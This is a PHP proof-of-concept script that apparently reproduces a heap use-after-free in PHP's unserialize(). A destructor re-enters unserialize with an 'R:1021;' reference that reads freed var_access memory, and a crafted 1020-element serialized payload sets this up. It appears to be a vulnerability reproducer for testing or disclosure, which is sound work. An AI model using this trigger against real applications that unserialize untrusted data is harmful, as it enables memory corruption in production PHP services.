<?php
// vd2: re-entrant var_access() walks the FREED entries chain.
// The destructor's unserialize('R:1021;') resolves id=1020:
//   embedded block used_slots==1018 (full) -> advance into freed block2,
//   read block2->used_slots + block2->data[2] from freed memory.
// Under default ZendMM the freed chunk is intact -> returns a REAL zval*
// (the tree bucket for key 9998, which now holds i:5) -> var_dump int(5).
// Under ASAN this same read is a heap-use-after-free receipt.
class D { public function __destruct() { var_dump(@unserialize('R:1021;')); } }
$els = [];
for ($k = 0; $k <= 1017; $k++) { $els[] = "i:$k;i:1;"; }
$els[] = 'i:9998;O:1:"D":0:{}';
$els[] = 'i:9998;i:5;';
$payload = 'a:1020:{' . implode('', $els) . '}';
$r = unserialize($payload);
echo "outer returned ";
var_dump($r !== false);
echo "SURVIVED\n";
